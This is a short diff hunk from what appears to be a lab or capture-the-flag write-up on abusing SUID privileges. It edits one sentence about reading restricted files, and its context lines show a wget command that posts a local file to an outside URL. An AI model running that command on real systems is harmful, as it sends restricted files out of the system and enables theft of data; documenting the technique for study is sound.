@@ -114,4 +114,4 @@ LFILE=file_to_send
 wget --post-file=$LFILE $URL
 ```
 
-We did not escalate our privileges, however, we did take advantage/abuse SUID privileges to read the contents of restricted files.
+We did not escalate our privileges using wget, however, we did take advantage/abuse SUID privileges to read the contents of restricted files.
